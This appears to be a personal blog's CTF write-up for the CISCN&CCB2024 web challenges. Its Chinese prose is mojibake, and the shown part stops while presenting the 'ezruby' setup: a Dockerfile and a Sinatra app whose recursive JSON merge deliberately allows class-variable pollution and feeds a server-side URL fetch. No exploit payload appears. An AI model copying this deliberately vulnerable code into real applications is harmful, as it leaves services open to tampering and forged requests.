
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>CISCN&amp;CCB2024 | é›²æµã®Lowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdnæŒ‚æ‰çš„æ—¶å€™è¦å¯ä»¥å¼•ç”¨æœ¬åœ° -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- å¼•å…¥jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--æ”¹æˆäº†prismjsé«˜äº®-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- å¼•å…¥ä¸è’œå­-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- ä»£ç è¯­è¨€ -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- ä»£ç å—å¤åˆ¶ -->
<!-- å¼•å…¥clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- ä»£ç å—æ”¶ç¼© -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- ä»£ç å—æŠ˜è¡Œ -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="é›²æµã®Lowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- é¡µé¢ç‚¹å‡»ç‰¹æ•ˆ -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- æµè§ˆå™¨æ ‡é¢˜ -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- åŠ¨æ€èƒŒæ™¯ -->
    

    <!--æ–‡ç« ç›®å½•-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  ç›®å½•</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezruby%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">ezrubyï¼ˆå¤ç°ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby%E7%B1%BB"><span class="toc-number">2.1.</span> <span class="toc-text">rubyç±»</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E6%B1%A1%E6%9F%93"><span class="toc-number">2.2.</span> <span class="toc-text">ç±»æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%BD%93%E5%89%8D%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text">æ±¡æŸ“å½“å‰å¯¹è±¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E7%88%B6%E7%B1%BB"><span class="toc-number">2.2.2.</span> <span class="toc-text">æ±¡æŸ“çˆ¶ç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%85%B6%E4%BB%96%E7%B1%BB"><span class="toc-number">2.2.3.</span> <span class="toc-text">æ±¡æŸ“å…¶ä»–ç±»</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sinatra%E4%B8%8B%E7%9A%84%E7%B1%BB%E6%B1%A1%E6%9F%93"><span class="toc-number">2.3.</span> <span class="toc-text">Sinatraä¸‹çš„ç±»æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99erb%E6%A8%A1%E6%9D%BF"><span class="toc-number">2.3.1.</span> <span class="toc-text">å†™erbæ¨¡æ¿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.2.</span> <span class="toc-text">è®¾ç½®é™æ€ç›®å½•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#helloweb%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">hellowebï¼ˆå¤ç°ï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#safeproxy"><span class="toc-number">4.</span> <span class="toc-text">safeproxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sxweb1%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">sxweb1ï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyweb%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">easywebï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sxweb2%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">sxweb2ï¼ˆUnsolvedï¼‰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BookManager%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">BookManagerï¼ˆUnsolvedï¼‰</span></a></li></ol>
    </div>
  

    <!--è¿”å›é¡¶éƒ¨-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="è¿”å›é¡¶éƒ¨">â†‘</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>ç¬¬ä¸€æ¬¡åŠ è½½æ–‡ç« å›¾ç‰‡å¯èƒ½ä¼šèŠ±è´¹è¾ƒé•¿æ—¶é—´</p>
                    <p>è¦ä¸æŒ‚ä¸ªæ¢¯å­è¯•è¯•ï¼Ÿï¼ˆx</p>
                    <p>åŠ è½½è¿‡æ…¢è¯·å¼€å¯ç¼“å­˜&ensp;æµè§ˆå™¨é»˜è®¤å¼€å¯</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>é›²æµã®LOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;é›²æµã®LOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>CISCN&amp;CCB2024</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/12/15
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTFçº¿ä¸Šèµ›
            </a>
        </span>
        
        
        <!--æ–‡ç« å­—æ•°ç»Ÿè®¡-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  å­—æ•°ç»Ÿè®¡: </span>
        <!-- å®‰è£…æ’ä»¶npm install hexo-wordcount --save -->
        <span class="post-count">3.4kå­—</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  é˜…è¯»æ—¶é•¿: </span>
        <span class="post-count">17åˆ†</span>
      </span>
    </span>
    
    <!--ä¸è’œå­ç»Ÿè®¡è®¿é—®æ•°-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    æ€»æ–‡ç« é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸€è§‰é†’æ¥NISAå®åŠ›ä¸‹é™ä¸€ä¸‡å€ï¼Œå“ˆå“ˆä¸¤äººé€€å½¹ä¹‹åæˆ‘ä»¬å®Œè›‹äº†</p>
<p>è¿™b webçœŸæ˜¯ä¸€å¤©æ¯”ä¸€å¤©éš¾æ‰“äº†ï¼Œæ¢­å“ˆåŠå¤©æ‹¿ä¸ä¸‹å°‘è§£é¢˜ï¼Œå…¶ä»–é¢˜å›å¤´å°±è¢«æ‰“çƒ‚ğŸ˜­</p>
<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16750">https://xz.aliyun.com/t/16750</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/16792">https://xz.aliyun.com/t/16792</a></p>
<p><a target="_blank" rel="noopener" href="https://p0lar1ght.github.io/posts/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%9B%BD%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF_WEB_bookmanager%E9%A2%98%E8%A7%A3/#%E4%B8%80%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">https://p0lar1ght.github.io/posts/%E7%AC%AC%E5%8D%81%E5%85%AB%E5%B1%8A%E5%9B%BD%E8%B5%9B%E6%9A%A8%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF_WEB_bookmanager%E9%A2%98%E8%A7%A3/#%E4%B8%80%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90</a></p>
<span id="more"></span>

<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215231840744.png" alt="image-20241215231840744"></p>
<hr>
<h1 id="ezrubyï¼ˆå¤ç°ï¼‰"><a href="#ezrubyï¼ˆå¤ç°ï¼‰" class="headerlink" title="ezrubyï¼ˆå¤ç°ï¼‰"></a>ezrubyï¼ˆå¤ç°ï¼‰</h1><p>ruby&#x2F;3.3.5 webrick&#x2F;1.9.1</p>
<p>æ‹¿ docker èµ·ä¸€ä¸‹ç¯å¢ƒ</p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> ruby:3.3.5-alpine</span>

<span class="token instruction"><span class="token keyword">WORKDIR</span> /usr/src/app</span>

<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g'</span> /etc/apk/repositories</span>
<span class="token instruction"><span class="token keyword">RUN</span> apk update &amp;&amp; apk add --no-cache build-base</span>

<span class="token instruction"><span class="token keyword">COPY</span> Gemfile ./</span>

<span class="token instruction"><span class="token keyword">RUN</span> bundle install</span>

<span class="token instruction"><span class="token keyword">COPY</span> . .</span>

<span class="token instruction"><span class="token keyword">EXPOSE</span> 8888</span>

<span class="token comment"># å¯åŠ¨åº”ç”¨</span>
<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"bundle"</span>, <span class="token string">"exec"</span>, <span class="token string">"ruby"</span>, <span class="token string">"main.rb"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Gemfile</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">source <span class="token string-literal"><span class="token string">"https://gems.ruby-china.com"</span></span>

gem <span class="token string-literal"><span class="token string">"sinatra"</span></span>
gem <span class="token string-literal"><span class="token string">"json"</span></span>
gem <span class="token string-literal"><span class="token string">"net-http"</span></span>
gem <span class="token string-literal"><span class="token string">"puma"</span></span>
gem <span class="token string-literal"><span class="token string">"rackup"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è‡ªå·±é…ç½®ä¸€ä¸‹è°ƒè¯•ç¯å¢ƒ</p>
<p>main.rb</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># frozen_string_literal: true</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'json'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/base'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'net/http'</span></span>


<span class="token keyword">class</span> <span class="token class-name">Person</span>
  <span class="token variable">@@url</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"http://default-url.com"</span></span>

  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span><span class="token punctuation">,</span> <span class="token symbol">:details</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token variable">@name</span> <span class="token operator">=</span> name
    <span class="token variable">@age</span> <span class="token operator">=</span> age
    <span class="token variable">@details</span> <span class="token operator">=</span> details
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">url</span></span>
    <span class="token variable">@@url</span>
  <span class="token keyword">end</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">merge_with</span></span><span class="token punctuation">(</span>additional<span class="token punctuation">)</span>
    recursive_merge<span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">,</span> additional<span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token keyword">private</span>


  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">recursive_merge</span></span><span class="token punctuation">(</span>original<span class="token punctuation">,</span> additional<span class="token punctuation">,</span> current_obj <span class="token operator">=</span> original<span class="token punctuation">)</span>
    additional<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>key<span class="token punctuation">,</span> value<span class="token operator">|</span>
      <span class="token keyword">if</span> value<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          next_obj <span class="token operator">=</span> current_obj<span class="token punctuation">.</span>public_send<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
          recursive_merge<span class="token punctuation">(</span>original<span class="token punctuation">,</span> value<span class="token punctuation">,</span> next_obj<span class="token punctuation">)</span>
        <span class="token keyword">else</span>
          new_object <span class="token operator">=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">new</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> new_object<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">else</span>
        <span class="token keyword">if</span> current_obj<span class="token punctuation">.</span>is_a<span class="token operator">?</span><span class="token punctuation">(</span><span class="token builtin">Hash</span><span class="token punctuation">)</span>
          current_obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
        <span class="token keyword">else</span>
          current_obj<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>
          current_obj<span class="token punctuation">.</span>singleton_class<span class="token punctuation">.</span>attr_accessor key
        <span class="token keyword">end</span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    original
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> Person
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span><span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span><span class="token punctuation">)</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token symbol">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span> <span class="token symbol">age</span><span class="token operator">:</span> age<span class="token punctuation">,</span> <span class="token symbol">details</span><span class="token operator">:</span> details<span class="token punctuation">)</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>


<span class="token keyword">class</span> <span class="token class-name">KeySigner</span>
  <span class="token variable">@@signing_key</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"default-signing-key"</span></span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">signing_key</span></span>
    <span class="token variable">@@signing_key</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">sign</span></span><span class="token punctuation">(</span>signing_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">data</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">-signed-with-</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">signing_key</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">JSONMergerApp</span> <span class="token operator">&lt;</span> Sinatra<span class="token double-colon punctuation">::</span>Base
  set  <span class="token symbol">:bind</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'0.0.0.0'</span></span>
  set  <span class="token symbol">:port</span> <span class="token punctuation">,</span>  <span class="token string-literal"><span class="token string">'8888'</span></span>
  post <span class="token string-literal"><span class="token string">'/merge'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>
    j_str <span class="token operator">=</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>read
    <span class="token keyword">return</span> <span class="token string-literal"><span class="token string">"try try try"</span></span>  <span class="token keyword">if</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"\\"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> j_str<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"h"</span></span><span class="token punctuation">)</span>

    json_input <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>parse<span class="token punctuation">(</span>j_str<span class="token punctuation">,</span> <span class="token symbol">symbolize_names</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">)</span>

    user <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>
      <span class="token symbol">name</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"John Doe"</span></span><span class="token punctuation">,</span>
      <span class="token symbol">age</span><span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>
      <span class="token symbol">details</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string-literal"><span class="token string">"occupation"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Engineer"</span></span><span class="token punctuation">,</span>
        <span class="token string-literal"><span class="token string">"location"</span></span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token string-literal"><span class="token string">"city"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Madrid"</span></span><span class="token punctuation">,</span>
          <span class="token string-literal"><span class="token string">"country"</span></span> <span class="token operator">=></span> <span class="token string-literal"><span class="token string">"Spain"</span></span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">)</span>

    user<span class="token punctuation">.</span>merge_with<span class="token punctuation">(</span>json_input<span class="token punctuation">)</span>

    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'merged'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>

  <span class="token comment"># GET /launch-curl-command - Activates the first gadget</span>
  get <span class="token string-literal"><span class="token string">'/launch-curl-command'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>

    <span class="token comment"># This gadget makes an HTTP request to the URL stored in the User class</span>
    <span class="token keyword">if</span> Person<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:url</span><span class="token punctuation">)</span>
      url <span class="token operator">=</span> Person<span class="token punctuation">.</span>url
      response <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token constant">HTTP</span><span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'HTTP request made'</span></span><span class="token punctuation">,</span> <span class="token symbol">url</span><span class="token operator">:</span> url <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
    <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Failed to access URL variable'</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
  
  get <span class="token string-literal"><span class="token string">'/sign_with_subclass_key'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>
    
    signer <span class="token operator">=</span> <span class="token class-name">KeySigner</span><span class="token punctuation">.</span><span class="token keyword">new</span>
    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"data-to-sign"</span></span><span class="token punctuation">)</span>

    <span class="token punctuation">&#123;</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">'Data signed'</span></span><span class="token punctuation">,</span> <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key<span class="token punctuation">,</span> <span class="token symbol">signed_data</span><span class="token operator">:</span> signed_data <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>
  
  get <span class="token string-literal"><span class="token string">'/check-infected-vars'</span></span> <span class="token keyword">do</span>
    content_type <span class="token symbol">:json</span>

    <span class="token punctuation">&#123;</span>
      <span class="token symbol">user_url</span><span class="token operator">:</span> Person<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
      <span class="token symbol">signing_key</span><span class="token operator">:</span> KeySigner<span class="token punctuation">.</span>signing_key
    <span class="token punctuation">&#125;</span><span class="token punctuation">.</span>to_json
  <span class="token keyword">end</span>

  get<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/'</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span>
    erb <span class="token symbol">:hello</span>
  <span class="token keyword">end</span>
  run<span class="token operator">!</span> <span class="token keyword">if</span> app_file <span class="token operator">==</span> $<span class="token number">0</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœç´¢å‘ç°ä»¥ä¸‹æ–‡ç« ï¼š</p>
